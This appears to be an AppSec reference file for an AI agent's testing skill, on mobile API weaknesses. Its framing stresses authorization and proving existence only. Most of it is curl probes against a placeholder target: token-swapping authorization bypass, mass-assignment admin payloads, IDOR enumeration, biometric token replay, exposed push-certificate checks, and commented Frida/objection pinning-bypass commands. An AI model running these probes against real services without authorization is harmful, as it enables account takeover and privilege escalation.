# Mobile API Testing Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized AppSec assessment reference** only, helping identify mobile API vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual mobile app exploitation prohibited
> - Mobile API testing is for understanding attack surface only, **no unauthorized API access**
> - Certificate pinning bypass requires explicit authorization, **no interception of other users' traffic**
> - Validation proves vulnerability existence (misconfiguration confirmed), **no user data access**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: OWASP Mobile Security, API Security Project

## Manual Testing

**Note: Test mobile APIs systematically with appropriate headers and authentication**

---

## Validation Objectives (Within Security Boundary)

Mobile API vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Certificate Pinning Bypass | ❌ Not by default | ✓ Requires explicit authorization | Intercept other users' traffic |
| API Versioning Differences | ✓ Compare v1 vs v2 endpoints | - | Exploit version-specific vulns |
| Mobile-Specific Headers | ✓ Test device/app headers | - | Spoof other users' device IDs |
| Push Notification Testing | ✓ Check notification security | - | Send unauthorized notifications |
| Biometric Auth API | ✓ Test biometric bypass | - | Bypass auth for other users |
| Mobile Token Handling | ✓ Analyze token storage/transport | - | Use tokens for unauthorized access |

**Safe Validation Method**: Test API endpoints with mobile headers and tokens belonging to your own test account.

---

## API Versioning Differences

### Version Discovery

```bash
# Common API versioning patterns
for version in "v1" "v2" "v3" "v4" "api/v1" "api/v2" "v1.0" "v2.0"; do
  for endpoint in "users" "auth" "login" "profile" "settings"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/${version}/${endpoint}" 2>/dev/null)
    if [ "$status" != "404" ] && [ "$status" != "000" ]; then
      echo "[+] /${version}/${endpoint} -> ${status}"
    fi
  done
done

# Check for deprecated API versions
curl -s "https://target.com/v1/users" | jq '.' > v1_response.json
curl -s "https://target.com/v2/users" | jq '.' > v2_response.json
diff v1_response.json v2_response.json
```

### Version Security Comparison

```bash
# Compare authentication requirements between versions
curl -s -o /dev/null -w "%{http_code}" "https://target.com/v1/users/profile"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/v2/users/profile"

# Compare rate limiting between versions
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/v1/users"
done

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/v2/users"
done

# Check for authorization bypass in older versions
curl -s -H "Authorization: Bearer OTHER_USER_TOKEN" "https://target.com/v1/users/profile"
```

---

## Mobile-Specific Headers

### Device and App Headers

```bash
# Test with mobile-specific headers
curl -s "https://target.com/api/endpoint" \
  -H "X-Device-ID: test_device_001" \
  -H "X-App-Version: 1.0.0" \
  -H "X-Platform: iOS" \
  -H "X-OS-Version: 17.0" \
  -H "X-Device-Model: iPhone15,2" \
  -H "X-Network-Type: WiFi" \
  -H "X-Carrier: TestCarrier" \
  -H "User-Agent: MyApp/1.0.0 (iOS 17.0; iPhone)"

# Test header bypass
# Old app version may bypass security checks
curl -s "https://target.com/api/endpoint" \
  -H "X-App-Version: 0.0.1"

# Different platform may have different authorization
curl -s "https://target.com/api/endpoint" \
  -H "X-Platform: android" \
  -H "X-App-Version: 1.0.0"
```

### API Key Testing

```bash
# Check for mobile API key requirements
curl -s "https://target.com/api/endpoint" \
  -H "X-API-Key: mobile_api_key" \
  -H "X-Device-ID: test_device_001"

# Test if API key is universally shared (hardcoded in app)
# Mobile apps often contain hardcoded API keys
curl -s "https://target.com/api/endpoint" \
  -H "X-API-Key: hardcoded_mobile_key"
```

---

## Certificate Pinning Bypass

### ⚠️ Requires Explicit Authorization

**Authorization Requirements**:
1. User explicitly authorizes traffic interception
2. Only intercept your own test account traffic
3. Mark "Certificate pinning bypassed with user authorization" in report
4. Do not capture or analyze other users' traffic

### Detection

```bash
# Check if certificate pinning is implemented
# Attempt connection with self-signed cert (will fail if pinning active)
openssl s_client -connect target.com:443 -CAfile custom_ca.pem

# Check for pin headers in response
curl -sI "https://target.com" | grep -i "public-key-pins\|pin-sha256"
```

### Common Bypass Techniques (Requires Authorization)

```bash
# Frida-based pinning bypass (requires authorization + rooted device)
# frida -U -f com.target.app -l ssl_pinning_bypass.js

# Objection-based pinning bypass (requires authorization)
# objection -g com.target.app explore
# android sslpinning disable

# These techniques require:
# 1. Explicit user authorization
# 2. Only for your own test account
# 3. Do not intercept production user traffic
```

---

## Push Notification Testing

### Notification Security Analysis

```bash
# Check notification endpoint security
curl -s "https://target.com/api/notifications" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.'

# Test for notification injection (requires authorization)
curl -s -X POST "https://target.com/api/notifications/register" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"device_token": "test_token", "platform": "ios"}'

# Check push notification configuration
curl -s "https://target.com/api/push/config" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.'
```

### FCM/APNS Testing

```bash
# Check for Firebase Cloud Messaging exposure
curl -s "https://target.com/firebase-messaging-sw.js" | grep -i "messagingSenderId\|apiKey\|projectId"
curl -s "https://target.com/google-services.json" | jq '.'

# Check for APNS certificate exposure
curl -s -o /dev/null -w "%{http_code}" "https://target.com/apns_cert.pem"
curl -s -o /dev/null -w "%{http_code}" "https://target.com/push_certificate.p12"
```

---

## Biometric Auth API

### Biometric Bypass Testing

```bash
# Test biometric auth endpoint
curl -s -X POST "https://target.com/api/auth/biometric" \
  -H "Content-Type: application/json" \
  -d '{"biometric_token": "test_token", "device_id": "test_device"}'

# Test if biometric can be bypassed
curl -s -X POST "https://target.com/api/auth/biometric" \
  -H "Content-Type: application/json" \
  -d '{"biometric_token": "", "device_id": "test_device"}'

# Test replay attack (use same token twice)
curl -s -X POST "https://target.com/api/auth/biometric" \
  -H "Content-Type: application/json" \
  -d '{"biometric_token": "PREVIOUS_TOKEN", "device_id": "test_device"}'

# Test device binding
curl -s -X POST "https://target.com/api/auth/biometric" \
  -H "Content-Type: application/json" \
  -d '{"biometric_token": "VALID_TOKEN", "device_id": "DIFFERENT_DEVICE"}'
```

---

## Mobile Token Handling

### Token Storage Analysis

```bash
# Check token format and security
# JWT token analysis
curl -s "https://target.com/api/auth/login" \
  -X POST -d '{"username":"test","password":"test"}' | jq '.token' | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

# Check token endpoint response
curl -s "https://target.com/api/auth/token" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.'
```

### Token Security Checklist

| Check | Secure | Risk |
|-------|--------|------|
| Token in URL query string | Should be in header | Exposed in logs/referrer |
| Token in localStorage | Should be Secure/HttpOnly cookie | XSS accessible |
| Short-lived tokens | Token expiry < 1 hour | Long-lived = high risk |
| Refresh token rotation | New refresh token on use | No rotation = replay risk |
| Token binding | Token bound to device/session | No binding = theft risk |

### API Security Testing Specific to Mobile

```bash
# Test for proper authorization on mobile endpoints
# Mobile APIs often have relaxed authorization

# Check if mobile API bypasses auth
curl -s "https://target.com/api/mobile/users" | jq '.'
curl -s "https://target.com/api/mobile/profile" | jq '.'

# Test for mass assignment in mobile API
curl -s -X PUT "https://target.com/api/mobile/profile" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "role": "admin", "is_admin": true}'

# Test for IDOR in mobile-specific endpoints
curl -s "https://target.com/api/mobile/users/1" \
  -H "Authorization: Bearer YOUR_TOKEN"
curl -s "https://target.com/api/mobile/users/2" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP API | API1-8:2023-Broken Object Level Authorization through Unrestricted Resource Access |
| CWE | CWE-295: Improper Certificate Validation |
| CWE | CWE-319: Cleartext Transmission of Sensitive Information |

---

## Analysis Process

1. Identify mobile-specific API endpoints (different paths, headers)
2. Test API version differences for security inconsistencies
3. Analyze mobile-specific headers for authorization bypass
4. Evaluate token storage and transport security (requires own test account)
5. Test biometric auth API for bypass possibilities
6. Check push notification configuration security
7. If certificate pinning needs bypass: obtain explicit authorization first
8. **Stop validation**, report findings without exploiting mobile APIs

---

## Output

```markdown
## Vulnerability: Mobile API Security Issues

### Location
{URL} - {API endpoint}

### Type
{Version Difference / Header Bypass / Token Issue / Biometric Bypass / Pinning Issue}

### Evidence
- API v1 auth: {status/behavior}
- API v2 auth: {status/behavior}
- Mobile header bypass: {header, result}
- Token storage: {localStorage/cookie/URL}

### Validation Result
- Version security inconsistency: {yes/no, details}
- Mobile header bypass: {yes/no}
- Token handling weakness: {yes/no, type}
- Biometric bypass possible: {yes/no}
- Certificate pinning: {present/bypassable/absent}

### Risk Level
{High/Medium} - {issue type} enables {attack type}
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Intercept other users' traffic | Only use your own test account |
| ❌ Use discovered tokens unauthorized | Tokens are evidence, not access |
| ❌ Send unauthorized push notifications | Only test your own device |
| ❌ Bypass biometric for other users | Only test with authorized test account |
| ❌ Exploit version differences | Only document security inconsistencies |
| ❌ Reverse engineer production apps | Only analyze API behavior from traffic |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Certificate pinning requires explicit authorization"
- `README.md` -> Prohibited execution checklist